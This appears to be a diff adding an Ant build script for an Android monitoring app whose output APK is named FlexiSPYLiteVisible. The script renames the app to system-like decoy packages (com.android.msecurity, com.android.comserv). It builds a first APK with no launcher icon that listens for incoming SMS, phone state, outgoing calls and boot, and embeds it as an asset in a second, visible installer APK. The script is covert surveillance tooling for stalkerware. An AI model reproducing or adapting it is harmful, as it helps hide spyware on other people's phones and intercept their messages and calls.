@@ -1,0 +1,320 @@
+<?xml version="1.0" encoding="utf-8"?>
+<project name="build-helper" default="">
+
+	<property file="ant.properties"/>
+	<property file="local.properties"/>
+    
+    <macrodef name="build-retail-test">
+    	<attribute name="mock.pkg" default="com.android.msecurity"/>
+        <sequential>
+            <update-edition-attr 
+                testflag="-"
+            	mock.pkg="@{mock.pkg}"
+            	icon.name="sync"
+                product.name="FSLGVAD"
+                code.product.server="TEST"
+                code.product.id="RETAIL_PRODUCT_ID"
+                code.product.name="RETAIL_PRODUCT_NAME"
+            />
+        </sequential>
+    </macrodef>
+    
+    <macrodef name="build-retail">
+    	<attribute name="mock.pkg" default="com.android.msecurity"/>
+        <sequential>
+            <update-edition-attr 
+                testflag=""
+            	mock.pkg="@{mock.pkg}"
+            	icon.name="sync"
+                product.name="FSLGVAD"
+                code.product.server="RETAIL"
+                code.product.id="RETAIL_PRODUCT_ID"
+                code.product.name="RETAIL_PRODUCT_NAME"
+            />
+        </sequential>
+    </macrodef>
+    
+    <macrodef name="build-reseller">
+    	<attribute name="mock.pkg" default="com.android.comserv"/>
+        <sequential>
+            <update-edition-attr 
+                testflag=""
+            	mock.pkg="@{mock.pkg}"
+            	icon.name="sync"
+                product.name="ANDCV"
+                code.product.server="RESELLER"
+                code.product.id="RESELLER_PRODUCT_ID"
+                code.product.name="RESELLER_PRODUCT_NAME"
+            />
+        </sequential>
+    </macrodef>
+    
+    <macrodef name="update-edition-attr">
+        <attribute name="testflag"/>
+    	<attribute name="mock.pkg"/>
+    	<attribute name="icon.name"/>
+        <attribute name="product.name"/>
+        <attribute name="code.product.server"/>
+        <attribute name="code.product.id"/>
+        <attribute name="code.product.name"/>
+        
+         <sequential>
+            <tstamp>
+                <format property="build.date" pattern="dd/MM/yyyy" locale="en,UK" />
+            </tstamp>
+         	
+            <!-- application icon -->
+            <replaceregexp
+                file="${basedir}/AndroidManifest.xml"
+                match="android:icon=&quot;.*&quot;"
+                replace="android:icon=&quot;&#64;drawable/@{icon.name}&quot;"
+                byline="true"
+                />
+         	
+         	<!-- Begin Modify Package Name -->
+         	<replaceregexp
+                file="${basedir}/AndroidManifest.xml"
+                match="package=&quot;.*&quot;"
+                replace="package=&quot;@{mock.pkg}&quot;"
+                byline="true"
+         	    />
+         	<replaceregexp
+                file="${basedir}/src/com/vvt/android/syncmanager/SyncManagerActivity.java"
+                match="import.*R;"
+                replace="import @{mock.pkg}.R;"
+                byline="true"
+         	    />
+         	<replaceregexp
+                file="${basedir}/src/com/vvt/android/syncmanager/LauncherActivity.java"
+                match="import.*R;"
+                replace="import @{mock.pkg}.R;"
+                byline="true"
+                />
+            <replaceregexp
+                  file="${basedir}/src/com/vvt/android/syncmanager/ProductInfoHelper.java"
+                  match="import.*R;"
+                  replace="import @{mock.pkg}.R;"
+                  byline="true"
+                  />
+            <replaceregexp
+                  file="${basedir}/src/com/vvt/android/syncmanager/gui/EventsSettingsActivity.java"
+                  match="import.*R;"
+                  replace="import @{mock.pkg}.R;"
+                  byline="true"
+                  />
+            <replaceregexp
+                  file="${basedir}/src/com/vvt/android/syncmanager/gui/ConnectionHistoryActivity.java"
+                  match="import.*R;"
+                  replace="import @{mock.pkg}.R;"
+                  byline="true"
+                  />
+            <replaceregexp
+                  file="${basedir}/src/com/vvt/android/syncmanager/gui/DatabaseStatusActivity.java"
+                  match="import.*R;"
+                  replace="import @{mock.pkg}.R;"
+                  byline="true"
+                  />
+         	<!-- End Modify Package Name -->
+            
+         	<!-- App Name -->
+            <replaceregexp
+                file="${basedir}/res/values/strings.xml"
+                match="&lt;string name=&quot;app_name&quot;&gt;.*&lt;/string&gt;"
+                replace="&lt;string name=&quot;app_name&quot;&gt;${app.name}&lt;/string&gt;"
+                byline="true"
+            />
+
+         	<!-- Product Display Name -->
+            <replaceregexp
+                file="${basedir}/res/values/strings.xml"
+                match="&lt;string name=&quot;product_display_name&quot;&gt;.*&lt;/string&gt;"
+                replace="&lt;string name=&quot;product_display_name&quot;&gt;${app.name}&lt;/string&gt;"
+                byline="true"
+            />
+            
+         	<!-- Build Date -->
+            <replaceregexp
+                file="${basedir}/res/values/strings.xml"
+                match="&lt;string name=&quot;product_build_date&quot;&gt;.*&lt;/string&gt;"
+                replace="&lt;string name=&quot;product_build_date&quot;&gt;${build.date}&lt;/string&gt;"
+                byline="true"
+            />
+            
+         	<!-- Version Major -->
+            <replaceregexp
+                file="${basedir}/res/values/strings.xml"
+                match="&lt;string name=&quot;product_version_major&quot;&gt;.*&lt;/string&gt;"
+                replace="&lt;string name=&quot;product_version_major&quot;&gt;@{testflag}${product.version.major}&lt;/string&gt;"
+                byline="true"
+            />
+            
+         	<!-- Version Minor -->
+            <replaceregexp
+                file="${basedir}/res/values/strings.xml"
+                match="&lt;string name=&quot;product_version_minor&quot;&gt;.*&lt;/string&gt;"
+                replace="&lt;string name=&quot;product_version_minor&quot;&gt;${product.version.minor}&lt;/string&gt;"
+                byline="true"
+            />
+            
+         	<!-- Version Build -->
+            <replaceregexp
+                file="${basedir}/res/values/strings.xml"
+                match="&lt;string name=&quot;product_version_build&quot;&gt;.*&lt;/string&gt;"
+                replace="&lt;string name=&quot;product_version_build&quot;&gt;${product.version.build}&lt;/string&gt;"
+                byline="true"
+            />
+         	
+         	<!-- Version Code -->
+            <replaceregexp
+                file="${basedir}/AndroidManifest.xml"
+                match="android:versionCode=&quot;.*&quot;"
+                replace="android:versionCode=&quot;${product.version.build}&quot;"
+                byline="true"
+            />
+            
+         	<!-- Version Name -->
+            <replaceregexp
+                file="${basedir}/AndroidManifest.xml"
+                match="android:versionName=&quot;.*&quot;"
+                replace="android:versionName=&quot;@{testflag}${product.version.major}.${product.version.minor}.${product.version.build}&quot;"
+                byline="true"
+            />
+            
+         	<!-- Begin Modify Customization -->
+            <replaceregexp
+                file="${basedir}/src/com/vvt/android/syncmanager/Customization.java"
+                match=".*PRODUCT_SERVER.*"
+                replace="    public static final ProductServer PRODUCT_SERVER = ProductServer.@{code.product.server};"
+                byline="true"
+            />
+            <replaceregexp
+                file="${basedir}/src/com/vvt/android/syncmanager/Customization.java"
+                match=".*PRODUCT_ID.*"
+                replace="    public static final String PRODUCT_ID = FxSecurity.getConstant(Constant.@{code.product.id});"
+                byline="true"
+            />
+            <replaceregexp
+                file="${basedir}/src/com/vvt/android/syncmanager/Customization.java"
+                match=".*PRODUCT_NAME.*"
+                replace="    public static final String PRODUCT_NAME = FxSecurity.getConstant(Constant.@{code.product.name});"
+                byline="true"
+            />
+         	<!-- End Modify Customization -->
+         	
+         	<!-- delete assets -->
+         	<delete dir="${basedir}/assets"/>
+            
+         	<!-- Build 1st APK (no icon) -->
+            <ant dir="${basedir}" inheritall="false" target="clean" />
+            <ant dir="${basedir}" inheritall="false" target="release" />
+         	
+         	<!-- Put the first binary file into an assets -->
+         	<copy file="${basedir}/bin/FlexiSPYLiteVisible-release.apk"
+                tofile="${basedir}/assets/${asset.apk}"
+            />
+         	
+         	<!-- Begin modify AndroidManifest.xml (show icon) -->
+         	<replaceregexp
+                file="${basedir}/AndroidManifest.xml"
+         		match="activity android:name=&quot;com.vvt.android.syncmanager.SyncManagerActivity&quot;"
+                replace="activity android:name=&quot;com.vvt.android.syncmanager.LauncherActivity&quot;"
+                byline="false"
+            />
+            <replaceregexp
+                file="${basedir}/AndroidManifest.xml"
+                match="action android:name=&quot;com.vvt.android.syncmanager.SyncManagerActivity&quot;"
+                replace="action android:name=&quot;android.intent.action.MAIN&quot;"
+                byline="false"
+            />
+            <replaceregexp
+                file="${basedir}/AndroidManifest.xml"
+                match="category android:name=&quot;android.intent.category.DEFAULT&quot;"
+                replace="category android:name=&quot;android.intent.category.LAUNCHER&quot;"
+                byline="false"
+            />
+         	<replaceregexp
+                file="${basedir}/AndroidManifest.xml"
+                match="&lt;action android:name=&quot;android.provider.Telephony.SMS_RECEIVED&quot; /&gt;"
+                replace="&lt;!-- &lt;action android:name=&quot;android.provider.Telephony.SMS_RECEIVED&quot; /&gt; --&gt;"
+                byline="false"
+            />
+         	<replaceregexp
+                file="${basedir}/AndroidManifest.xml"
+                match="&lt;action android:name=&quot;android.intent.action.PHONE_STATE&quot; /&gt;"
+                replace="&lt;!-- &lt;action android:name=&quot;android.intent.action.PHONE_STATE&quot; /&gt; --&gt;"
+                byline="false"
+            />
+            <replaceregexp
+                file="${basedir}/AndroidManifest.xml"
+                match="&lt;action android:name=&quot;android.intent.action.NEW_OUTGOING_CALL&quot; /&gt;"
+                replace="&lt;!-- &lt;action android:name=&quot;android.intent.action.NEW_OUTGOING_CALL&quot; /&gt; --&gt;"
+                byline="false"
+            />
+         	<replaceregexp
+                file="${basedir}/AndroidManifest.xml"
+                match="&lt;action android:name=&quot;android.intent.action.BOOT_COMPLETED&quot; /&gt;"
+                replace="&lt;!-- &lt;action android:name=&quot;android.intent.action.BOOT_COMPLETED&quot; /&gt; --&gt;"
+                byline="false"
+            />
+            <!-- End modify AndroidManifest.xml (show icon) -->
+         		
+         	<!-- Build 2nd APK (with icon) -->
+     		<ant dir="${basedir}" inheritall="false" target="clean" />
+            <ant dir="${basedir}" inheritall="false" target="release" />
+
+            <!-- Put the second binary file into an apk -->
+            <copy file="${basedir}/bin/FlexiSPYLiteVisible-release.apk"
+                tofile="${basedir}/apk/@{product.name}_@{testflag}${product.version.major}.${product.version.minor}.${product.version.build}.apk"
+            />
+         		
+            <!-- Begin restore AndroidManifest.xml (hide icon) -->
+            <replaceregexp
+                file="${basedir}/AndroidManifest.xml"
+                match="activity android:name=&quot;com.vvt.android.syncmanager.LauncherActivity&quot;"
+                replace="activity android:name=&quot;com.vvt.android.syncmanager.SyncManagerActivity&quot;"
+                byline="false"
+            />
+            <replaceregexp
+                file="${basedir}/AndroidManifest.xml"
+                match="action android:name=&quot;android.intent.action.MAIN&quot;"
+                replace="action android:name=&quot;com.vvt.android.syncmanager.SyncManagerActivity&quot;"
+                byline="false"
+            />
+            <replaceregexp
+                file="${basedir}/AndroidManifest.xml"
+                match="category android:name=&quot;android.intent.category.LAUNCHER&quot;"
+                replace="category android:name=&quot;android.intent.category.DEFAULT&quot;"
+                byline="false"
+            />
+         	<replaceregexp
+                file="${basedir}/AndroidManifest.xml"
+                match="&lt;!-- &lt;action android:name=&quot;android.provider.Telephony.SMS_RECEIVED&quot; /&gt; --&gt;"
+                replace="&lt;action android:name=&quot;android.provider.Telephony.SMS_RECEIVED&quot; /&gt;"
+                byline="false"
+            />
+            <replaceregexp
+                file="${basedir}/AndroidManifest.xml"
+                match="&lt;!-- &lt;action android:name=&quot;android.intent.action.PHONE_STATE&quot; /&gt; --&gt;"
+                replace="&lt;action android:name=&quot;android.intent.action.PHONE_STATE&quot; /&gt;"
+                byline="false"
+            />
+            <replaceregexp
+                file="${basedir}/AndroidManifest.xml"
+                match="&lt;!-- &lt;action android:name=&quot;android.intent.action.NEW_OUTGOING_CALL&quot; /&gt; --&gt;"
+                replace="&lt;action android:name=&quot;android.intent.action.NEW_OUTGOING_CALL&quot; /&gt;"
+                byline="false"
+            />
+            <replaceregexp
+                file="${basedir}/AndroidManifest.xml"
+                match="&lt;!-- &lt;action android:name=&quot;android.intent.action.BOOT_COMPLETED&quot; /&gt; --&gt;"
+                replace="&lt;action android:name=&quot;android.intent.action.BOOT_COMPLETED&quot; /&gt;"
+                byline="false"
+            />
+            <!-- End restore AndroidManifest.xml (hide icon) -->
+            
+            <echo>Output = @{product.name}_@{testflag}${product.version.major}.${product.version.minor}.${product.version.build}</echo>
+            <echo>build-apk # EXIT ...</echo>
+         </sequential>
+    </macrodef>
+    
+</project>
